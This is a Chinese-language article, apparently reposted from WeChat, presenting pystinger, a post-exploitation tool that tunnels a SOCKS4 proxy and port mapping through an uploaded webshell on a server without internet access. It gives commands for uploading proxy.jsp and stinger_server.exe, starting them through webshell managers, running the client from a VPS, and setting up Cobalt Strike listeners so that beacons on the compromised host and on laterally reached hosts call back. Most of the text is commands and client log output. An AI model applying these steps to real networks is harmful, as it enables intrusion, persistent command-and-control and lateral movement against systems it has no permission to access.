> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/abWx9Vet0qGjvSF7AmYlTQ)

        pystinger 通过 webshell 实现内网 SOCK4 代理, 端口映射，可直接用于 metasploit-framework,viper,cobalt strike 上线。

        主体使用 python 开发, 当前支持 php,jsp(x),aspx 三种代理脚本。

>      假设不出网服务器域名为 http://example.com:8080 , 服务器内网 IP 地址为 192.168.3.11

1 . SOCK4 代理
------------

*   proxy.jsp 上传到目标服务器, 确保 http://example.com:8080/proxy.jsp 可以访问, 页面返回 `UTF-8`
    
*   将 stinger_server.exe 上传到目标服务器, 蚁剑 / 冰蝎执行`start D:/XXX/stinger_server.exe`启动服务端
    

> 不要直接运行 D:/XXX/stinger_server.exe, 会导致 tcp 断连

*   vps 执行`./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000`
    
*   如下输出表示成功
    

```
root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://example.com:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 127.0.0.1:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```

*   此时已经在 vps`127.0.0.1:60000`启动了一个`example.com`所在内网的 socks4a 代理
    
*   此时已经将目标服务器的`127.0.0.1:60020`映射到 vps 的`127.0.0.1:60020`
    

2 . cobalt strike 单主机上线
-----------------------

*   proxy.jsp 上传到目标服务器, 确保 http://example.com:8080/proxy.jsp 可以访问, 页面返回 `UTF-8`
    
*   将 stinger_server.exe 上传到目标服务器, 蚁剑 / 冰蝎执行`start D:/XXX/stinger_server.exe`启动服务端
    

> 不要直接运行 D:/XXX/stinger_server.exe, 会导致 tcp 断连

*   stinger_client 命令行执行`./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000`
    
*   如下输出表示成功
    

```
root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://example.com:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 127.0.0.1:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```

*   cobalt strike 添加监听, 端口选择输出信息 RAT Config 中的 Handler/LISTEN 中的端口 (通常为 60020),beacons 为 127.0.0.1
    
*   生成 payload, 上传到主机运行后即可上线
    

3 . cobalt strike 多主机上线
-----------------------

*   proxy.jsp 上传到目标服务器, 确保 http://example.com:8080/proxy.jsp 可以访问, 页面返回 `UTF-8`
    
*   将 stinger_server.exe 上传到目标服务器, 蚁剑 / 冰蝎执行`start D:/XXX/stinger_server.exe 192.168.3.11`启动服务端
    

> 192.168.3.11 可以改成 0.0.0.0

*   stinger_client 命令行执行`./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000`
    
*   如下输出表示成功
    

```
root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://example.com:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 192.168.3.11:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 192.168.3.11:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```

*   cobalt strike 添加监听, 端口选择 RAT Config 中的 Handler/LISTEN 中的端口 (通常为 60020),beacons 为 192.168.3.11(example.com 的内网 IP 地址)
    
*   生成 payload, 上传到主机运行后即可上线
    
*   横向移动到其他主机时可以将 payload 指向 192.168.3.11:60020 即可实现出网上线
    

4 . 定制 Header 及 proxy
---------------------

*   如果 webshell 需要配置 Cookie 或者 Authorization, 可通过 --header 参数配置请求头
    

`--header "Authorization: XXXXXX,Cookie: XXXXX"`

*   如果 webshell 需要通过代理访问, 可通过 --proxy 设置代理
    

`--proxy "socks5:127.0.0.1:1081"`

stinger_server\stinger_client
-----------------------------

*   windows
    
*   linux
    

proxy.jsp(x)/php/aspx

*   php7.2
    
*   tomcat7.0
    
*   iis8.0
    

项目地址：  

https://github.com/FunnyWolf/pystinger/releases/tag/v1.6